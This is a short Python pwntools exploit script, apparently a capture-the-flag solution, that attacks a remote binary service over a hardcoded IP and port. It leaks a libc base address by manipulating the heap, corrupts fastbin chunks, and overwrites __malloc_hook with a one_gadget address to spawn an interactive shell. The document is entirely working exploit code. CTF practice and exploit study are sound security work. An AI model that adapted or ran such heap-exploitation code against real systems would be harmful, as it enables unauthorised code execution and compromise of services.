from pwn import *
def cmd(c):
	p.sendlineafter(":\n",str(c))
def add(size,c="A\n"):
	cmd(1)
	p.sendlineafter(": \n",str(size))
	p.sendafter(": \n",c)
def cheat(size):
	cmd(1)
	p.sendlineafter(": \n",str(size))
def free(idx):
	cmd(2)
	p.sendlineafter(": \n",str(idx))
def show():
	cmd(3)
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
#p=process('./timu')
p=remote("111.198.29.45",34670)
context.log_level='debug'
add(0x400)#0
add(0x88)#1
add(0x88)#2
free(0)
add(0x18,"A"*0x18)#0
add(0x88)#3
add(0x88)#4
free(3)
free(1)
add(0x1e0-8)#1
add(0x88)#3
show()
p.readuntil("4 : ")
base=u64(p.readuntil(" ")[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b78-0x7ffff7a0d000)
log.warning(hex(base))
libc.address=base
add(0x68)#5
add(0x68)#6
free(5)
free(6)
free(4)
free(0)
one=0xf02a4
add(0x68,p64(libc.sym['__malloc_hook']-35)+'\n')#0
add(0x68)
add(0x68)#5
add(0x68,'\x00'*19+p64(one+base)+'\n')

free(0)
free(5)
#gdb.attach(p,"b _int_free")
p.interactive()
